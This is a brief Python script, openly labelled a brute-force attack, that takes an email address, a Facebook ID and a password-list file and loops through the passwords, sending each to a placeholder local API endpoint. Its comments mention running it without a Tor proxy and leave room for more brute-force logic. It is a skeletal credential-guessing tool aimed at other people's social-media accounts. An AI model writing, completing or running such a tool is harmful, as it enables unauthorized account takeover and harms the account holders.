import requests

# Local API details
local_api_url = "http://127.0.0.1:5000/your-api-endpoint"

# Function to perform brute force attack without Tor proxy
def brute_force(username, fb_id, passwords):
    for password in passwords:
        try:
            # Example: Make a request to the local API without using a proxy
            result = requests.get(local_api_url, params={'username': username, 'password': password}, timeout=10)
            
            # Process result as needed
            print(result.text)
        except requests.exceptions.RequestException as e:
            print(f"Request Error: {e}")

        # Rest of your brute-force logic
        # ...

# Function to read passwords from a file
def read_passwords(file_path):
    with open(file_path, 'r') as file:
        return file.read().splitlines()

# Function to execute the main brute-force attack
def main():
    username = input("Enter email address (as username): ")
    fb_id = input("Enter Facebook ID: ")
    password_file = input("Enter the password file name: ")

    # Read passwords from file
    passwords = read_passwords(password_file)

    # Perform brute-force attack
    brute_force(username, fb_id, passwords)

if __name__ == '__main__':
    main()
